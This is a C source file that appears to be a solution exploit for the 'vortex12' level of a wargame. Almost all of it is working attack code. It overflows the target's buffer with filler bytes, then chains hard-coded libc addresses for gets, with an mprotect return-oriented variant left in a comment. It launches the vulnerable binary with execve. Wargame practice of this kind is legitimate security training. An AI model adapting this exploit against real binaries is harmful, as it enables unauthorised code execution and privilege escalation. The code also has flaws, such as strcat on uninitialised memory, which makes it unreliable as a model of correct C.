#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>

#define PUT32(addr,val) do { \
                          (addr)[0]=(val)&0xff; \
                          (addr)[1]=((val)>>8)&0xff; \
                          (addr)[2]=((val)>>16)&0xff; \
                          (addr)[3]=((val)>>24)&0xff; \
                        } while (0);


#define DWORD 4
#define LIBCBASE 0xf7c00000
#define MPROTECT_OFFSET 0x11f770
#define GETS_OFFSET 0x710e0 
#define FGETS_OFFSET 0x6b480 
#define PERCENT_D_STR_LOC 0x804a008
#define RODATA_LEN 0x4

int main(void) {


  char FILL[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB";

  char gets_addr[DWORD+1] = "";
  PUT32(gets_addr, LIBCBASE+GETS_OFFSET);

  uint rop_chain_size = (sizeof(FILL)+1000);
  char *mprotect_rop = (char *) malloc(sizeof(char)*rop_chain_size);

  char stack_addr_gets_on[DWORD+1] = "";
  PUT32(stack_addr_gets_on, 0xffffc010);

  strcat(mprotect_rop, FILL);
  strcat(mprotect_rop, gets_addr);
  strcat(mprotect_rop, stack_addr_gets_on);

	char *argv[3] = {"./vortex12", mprotect_rop, 0};
	execve("./vortex12", argv, NULL);
}

/*int main(void) {


  char FILL[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB";
  char NEXT_ADDR[DWORD+1] = "";
  PUT32(NEXT_ADDR, 0x69696969);

  char mprotect_addr[DWORD+1] = "";
  PUT32(mprotect_addr, LIBCBASE+MPROTECT_OFFSET);

  char mprotect_args[DWORD+DWORD+DWORD+1] = "";
  PUT32(mprotect_args, PROT_READ | PROT_WRITE);
  PUT32(mprotect_args+DWORD, RODATA_LEN);
  PUT32(mprotect_args+(DWORD*2), PERCENT_D_STR_LOC);

  uint rop_chain_size = (sizeof(mprotect_addr)+sizeof(mprotect_args)+sizeof(FILL)+sizeof(NEXT_ADDR));
  char *mprotect_rop = (char *) malloc(sizeof(char)*rop_chain_size);

  strcat(mprotect_rop, FILL);
  strcat(mprotect_rop, mprotect_addr);
  strcat(mprotect_rop, mprotect_args);

	char *argv[3] = {"./vortex12", mprotect_rop, 0};
	execve("./vortex12", argv, NULL);
}*/

